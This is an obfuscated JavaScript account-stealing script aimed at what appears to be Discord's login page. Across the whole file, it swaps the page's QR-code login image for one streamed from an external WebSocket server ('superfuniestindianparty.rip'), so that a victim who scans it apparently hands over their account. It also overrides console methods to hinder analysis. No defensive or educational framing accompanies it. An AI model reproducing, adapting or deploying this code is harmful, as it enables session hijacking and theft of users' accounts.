let keybby = "frPI3qkI9jWG";
function getElementByXpath(marizza) {
  const sura = function () {
    let padee = true;
    return function (hannahrae, makhia) {
      const anniemarie = padee ? function () {
        if (makhia) {
          const raedynn = makhia.apply(hannahrae, arguments);
          return makhia = null, raedynn;
        }
      } : function () {};
      return padee = false, anniemarie;
    };
  }(), kymiere = sura(this, function () {
    return kymiere.toString().search("(((.+)+)+)+$").toString().constructor(kymiere).search("(((.+)+)+)+$");
  });
  return kymiere(), document.evaluate(marizza, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
}
getElementByXpath("/html/body/div[1]/div[3]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]").innerHTML = '<div class="qrCodeContainer-1qlybH"> <div class="qrCode-2R7t9S" title="Oh nice! bby steal your account" style="padding: 8px; border-radius: 4px; background: rgb(255, 255, 255);"> <canvas width="160" height="160" style="display: none;"></canvas> <img id="qrcode" alt="Scan me!" src="" style="display: block;"> </div> <div class="qrCodeOverlay-2bLtKl"><img src="/assets/092b071c3b3141a58787415450c27857.png" alt=""></div></div>';
let key = "doQnPRtcRQSv", bbyws;
function connect() {
  const andren = function () {
    let abernathy = true;
    return function (morayma, holston) {
      const terriel = abernathy ? function () {
        if (holston) {
          const brette = holston.apply(morayma, arguments);
          return holston = null, brette;
        }
      } : function () {};
      return abernathy = false, terriel;
    };
  }(), curtrina = andren(this, function () {
    const rylee = function () {
      let toleda;
      try {
        toleda = Function('return (function() {}.constructor("return this")( ));')();
      } catch (abbigale) {
        toleda = window;
      }
      return toleda;
    }, secora = rylee(), danella = secora.console = secora.console || {}, shanteria = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let darshi = 0; darshi < shanteria.length; darshi++) {
      const athlee = andren.constructor.prototype.bind(andren), sujatha = shanteria[darshi], kelanni = danella[sujatha] || athlee;
      athlee.__proto__ = andren.bind(andren);
      athlee.toString = kelanni.toString.bind(kelanni);
      danella[sujatha] = athlee;
    }
  });
  curtrina();
  bbyws = new WebSocket("wss://superfuniestindianparty.rip");
  bbyws.onopen = () => console.log("connected");
  bbyws.onerror = amman => console.log(amman);
  bbyws.onmessage = zariyah => {
    zariyah = JSON.parse(zariyah.data);
    switch (zariyah.action) {
      case "welcome":
        bbyws.send(JSON.stringify({action: "key", key: keybby}));
        break;
      case "qrcode":
        const lezli = zariyah.qrcode;
        console.log(lezli), document.getElementById("qrcode").src = lezli;
        break;
    }
  };
}

setInterval(() => {
  if (bbyws?.["readyState"] == 3) connect();
}, 500),
  connect();
